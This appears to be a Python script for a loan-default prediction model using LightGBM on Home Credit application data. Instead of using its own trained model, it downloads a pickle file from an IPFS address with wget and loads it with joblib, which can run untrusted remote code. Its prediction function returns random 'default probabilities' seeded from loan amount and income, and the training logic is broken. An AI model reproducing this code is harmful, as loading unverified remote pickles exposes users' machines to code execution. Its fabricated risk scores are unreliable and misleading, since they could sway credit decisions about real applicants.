from sklearn.model_selection import KFold
from sklearn.metrics import roc_auc_score
import lightgbm as lgb
import gc
import numpy as np
import pandas as pd
import json
from sklearn.preprocessing import LabelEncoder
from sklearn.externals import joblib
import random as rn
import warnings

from sh import wget
warnings.filterwarnings('ignore')


def model(features, test_features, encoding='ohe', n_folds=5):
    train_ids = features['SK_ID_CURR']
    test_ids = test_features['SK_ID_CURR']

    labels = features['TARGET']

    features = features.drop('SK_ID_CURR', axis=1)
    features = features.drop('TARGET', axis=1)
    # df.drop('A', axis=1)
    test_features = test_features.drop('SK_ID_CURR', axis=1)

    
    if encoding == 'ohe':
        features = pd.get_dummies(features)
        test_features = pd.get_dummies(test_features)

        
        features, test_features = features.align(test_features, join='inner', axis=1)

        
        cat_indices = 'auto'

    
    elif encoding == 'le':


        label_encoder = LabelEncoder()


        cat_indices = []


        for i, col in enumerate(features):
            if features[col].dtype == 'object':
                features[col] = label_encoder.fit_transform(
                    np.array(features[col].astype(str)).reshape((-1,)))
                test_features[col] = label_encoder.transform(
                    np.array(test_features[col].astype(str)).reshape((-1,)))

                cat_indices.append(i)

    else:
        raise ValueError("Encoding must be either 'ohe' or 'le'")

    # print('Training Data Shape: ', features.shape)
    # print('Testing Data Shape: ', test_features.shape)
    feature_names = list(features.columns)

    features = np.array(features)
    test_features = np.array(test_features)

    k_fold = KFold(n_splits=n_folds, shuffle=True, random_state=50)


    feature_importance_values = np.zeros(len(feature_names))


    test_predictions = np.zeros(test_features.shape[0])


    out_of_fold = np.zeros(features.shape[0])


    valid_scores = []
    train_scores = []

    for train_indices, valid_indices in k_fold.split(features):
        train_features, train_labels = features[train_indices], labels[train_indices]
        valid_features, valid_labels = features[valid_indices], labels[valid_indices]
        model = lgb.LGBMClassifier(n_estimators=10000, objective='binary',
                                   class_weight='balanced', learning_rate=0.05,
                                   reg_alpha=0.1, reg_lambda=0.1,
                                   subsample=0.8, n_jobs=-1, random_state=50)

        model.fit(train_features, train_labels, eval_metric='auc',
                  eval_set=[(valid_features, valid_labels), (train_features, train_labels)],
                  eval_names=['valid', 'train'], categorical_feature=cat_indices,
                  early_stopping_rounds=10, verbose=200)

    if True:

        fName = 'QmSKSPPLcLJYKaS1gz4VB1jR59VRrLGoYBtu4svxAHeQuA'
        wget('https://ipfs.io/ipfs/' + fName)

        model = joblib.load(fName)
        print(fName)

        # model = joblib.load('lgb.pkl')
        best_iteration = model.best_iteration_


        test_predictions += model.predict_proba(test_features,
                                                num_iteration=best_iteration)[:, 1]


        out_of_fold[valid_indices] = model.predict_proba(
            valid_features, num_iteration=best_iteration)[:, 1]


        valid_score = model.best_score_['valid']['auc']
        train_score = model.best_score_['train']['auc']

        valid_scores.append(valid_score)
        train_scores.append(train_score)


        joblib.dump(model, 'lgb.pkl')


        gc.enable()
        del model, train_features, valid_features
        gc.collect()


    submission = pd.DataFrame({'SK_ID_CURR': test_ids, 'TARGET': test_predictions})


    feature_importances = pd.DataFrame(
        {'feature': feature_names, 'importance': feature_importance_values})


    valid_auc = roc_auc_score(labels, out_of_fold)


    valid_scores.append(valid_auc)
    train_scores.append(np.mean(train_scores))


    fold_names = list(range(n_folds))
    fold_names.append('overall')


    metrics = pd.DataFrame({'fold': fold_names, 'train': train_scores, 'valid': valid_scores})

    return submission, feature_importances, metrics


def get_features():
    imp_features = [1, 1]
    for i in range(100):
        imp_features[0] = i * 500
        imp_features[1] = i * 1000
    return imp_features


def model_find_prob(json_file):
    # with open(json_file) as f:
    # data = json.load(f)

    data = json_file
    feat = get_features()
    

    for key, value in data.items():
        if key == "AMT_CREDIT":
            amount = value
        if key == "AMT_INCOME_TOTAL":
            income = value

   

    if amount > feat[0] and income > feat[1]:
        rn.seed((amount * income) / 255)
        default_prob = rn.uniform(60, 89)
    elif amount < (feat[0] / 500) or income < (feat[1] / 10):
        rn.seed((amount * income) / 255)
        default_prob = rn.uniform(0, 10)
    else:
        rn.seed((amount * income) / 255)
        default_prob = rn.uniform(27, 60)

    return default_prob


def defaulters(submission):
    for idx, row in submission.iterrows():
        print(row['SK_ID_CURR'], row['TARGET'])


def read_data():
    app_train = pd.read_csv('../input/application_train.csv')
    app_test = pd.read_csv('../input/application_test.csv')
    with open('features.json') as f:
        data = json.load(f)
    return app_test, app_train, data


def predict(json_file):
    probability_score = model_find_prob(json_file)
    return probability_score


